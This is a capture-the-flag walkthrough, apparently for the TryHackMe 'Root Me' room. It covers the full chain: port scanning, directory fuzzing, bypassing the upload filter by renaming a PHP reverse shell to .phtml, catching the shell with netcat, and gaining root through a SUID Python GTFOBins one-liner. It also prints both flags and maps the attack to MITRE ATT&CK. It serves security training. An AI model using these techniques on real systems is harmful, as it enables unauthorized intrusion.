# Root Me

## Target Information

Target IP: 10.49.147.30

## Reconnaissance

### Nmap

Scanning the network for any open ports

```jsx
nmap -sS -p- 10.49.147.30 --min-rate 20000
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-24 14:39 UTC
Nmap scan report for ip-10-49-147-30.ap-south-1.compute.internal (10.49.147.30)
Host is up (0.0044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds`
```

There are 2 Open ports, Targeting only the Open port 

- SSH - 22
- HTTP - 80

Types of Scan Used:

- Version Scan
- Aggressive Scan
- OS Scan

```jsx
nmap -sV -A -O -p22,80 10.49.147.30 --min-rate 20000 
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-24 14:39 UTC
Nmap scan report for ip-10-49-147-30.ap-south-1.compute.internal (10.49.147.30)
Host is up (0.00063s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a791668adb933d8927f8bd5b58a23719 (RSA)
|   256 2f3523863238502e470e738285374cf4 (ECDSA)
|_  256 8f215de612c8297a6ea883ec683f8c12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (93%), Linux 3.8 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   1.03 ms ip-10-49-147-30.ap-south-1.compute.internal (10.49.147.30)

```

Targeting the HTTP (first) 

```jsx
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

The Home page of the target site

<img width="1919" height="658" alt="image" src="https://github.com/user-attachments/assets/b24198cc-7816-4b48-895a-da0558fa0682" />


## Enumeration

### FFUF

Going to perform the directory enumeration on the target site

```jsx
ffuf -u "http://10.49.147.30/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200
```

```jsx
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 9ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 0ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 2ms]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 3ms]
```

Checking out panel 

<img width="1919" height="670" alt="image" src="https://github.com/user-attachments/assets/1ea3bd53-7682-403e-9003-15a1c52d4709" />

Uploaded a demo file “small.txt”

<img width="1919" height="671" alt="image" src="https://github.com/user-attachments/assets/5604632b-3201-4028-9ca9-b88be1e996ed" />

**/upload**
<img width="1919" height="659" alt="image" src="https://github.com/user-attachments/assets/75f9d08e-0bd9-47ba-8006-68be9b50f915" />

Moving to exploitation phase.

## Exploitation

We can perform file upload vulnerability on the site.

During the Nmap scan found that the site has PHP uses this cookie by default for session management.

<img width="1919" height="769" alt="image" src="https://github.com/user-attachments/assets/abae87c0-98b5-45c4-86ea-3507182a1cfb" />

We need a php reverse shell script to upload it.

Script Link From pentestmonkey: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

<img width="1914" height="694" alt="image" src="https://github.com/user-attachments/assets/2caf7d51-3bbd-44b7-ad35-0088a77483c5" />

Change the IP address to attacking machine IP and port 2222.

<img width="1917" height="649" alt="image" src="https://github.com/user-attachments/assets/028cde7f-f033-4a01-84b4-0456a10f17ce" />

When uploading php_reverse_shell.php the upload filter is restricting the php file. And Showing message php is not allowed.

Modified the .php extension to .phtml to bypass the upload file filter.

phtml extension are most commonly associated with PHP Web pages. The PHTML files contain PHP code that is parsed by a PHP engine. This allows the Web server to generate dynamic HTML that is displayed in a Web browser. The PHTML files are often used to access databases.

<img width="1918" height="653" alt="image" src="https://github.com/user-attachments/assets/e45cd90c-e680-4601-bba3-ba3f844bf4e5" />

Successfully bypassed the upload file filter.

Setting up the netcat tool to listen on port 2222

<img width="1876" height="242" alt="image" src="https://github.com/user-attachments/assets/8f63cc9c-41e6-4849-a679-a92fbcd2573e" />

Clicking the uploaded file in the upload. 

<img width="1890" height="527" alt="image" src="https://github.com/user-attachments/assets/e2fd15ae-6e90-44a7-9939-70fe9a923da7" />

Successfully gained access.

finding the user.txt.

```jsx
$ find / -name "user.txt" 2>/dev/null
/var/www/user.txt
```

user.txt

```jsx
THM{y0u_g0t_a_sh3ll}
```

## Privilege Escalation

In order to  access the root.txt we have to be root user. SUID (Set User ID) allows a program to run with the privileges of its owner rather than the user executing it. When a file owned by root has the SUID bit set, it can potentially be abused to gain root access.

```jsx
find / -type f -user root -perm -u=s 2>/dev/null
```

What does this command do:

- **find /** — Search starting from the root directory (the entire filesystem)
- **type f** — Only look for regular files (ignore directories, devices, etc.)
- **user root** — Only return files owned by the root user
- **perm -u=s** — Find files with the SUID bit set
- **2>/dev/null** — Redirects permission errors (which would clutter output) into the void

<img width="1919" height="659" alt="image" src="https://github.com/user-attachments/assets/39f5cb5d-15ef-4f82-8172-73a0814d7dc4" />

We can abuse the python2.7 using the platform: https://gtfobins.org/

<img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/4d830661-937c-44ff-8522-9c666a4b2e92" />

Search for python then move to shell section and select the option SUID.

The payload :

```jsx
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<img width="1919" height="563" alt="image" src="https://github.com/user-attachments/assets/371a0125-1e55-4195-832a-a455c5a15df7" />

Gained root access.

Finding the root.txt file for the flag

```jsx
find / -name "root.txt" 2>/dev/null
```

Got the root.txt flag 

```jsx
THM{pr1v1l3g3_3sc4l4t10n}
```

<img width="1919" height="355" alt="image" src="https://github.com/user-attachments/assets/d4961c4f-03df-4b5f-b536-681eaee93f71" />

## MITRE ATT&CK Mapping

### 1. Reconnaissance

- T1046 – Network Service Discovery
Reason: Used Nmap to discover open ports and services.

### 2. Initial Access

- T1190 – Exploit Public Facing Application
Reason: Exploited file upload functionality to gain remote code execution.

### 3. Persistence / Execution

- T1505.003 – Web Shell
Reason: Uploaded malicious .phtml reverse shell.

### 4. Command and Control

- T1071 – Application Layer Protocol
Reason: Reverse shell communication over TCP.

### 5. Discovery

- T1083 – File and Directory Discovery
Reason: Used “find” command to locate sensitive files.

### 6. Privilege Escalation

- T1548.001 – Abuse Elevation Control Mechanism (SUID)
Reason: Abused SUID Python binary to spawn root shell.

### 7. Collection

- T1005 – Data from Local System
Reason: Accessed user.txt and root.txt.

## DONE BY

### RUTHRAN-SEC
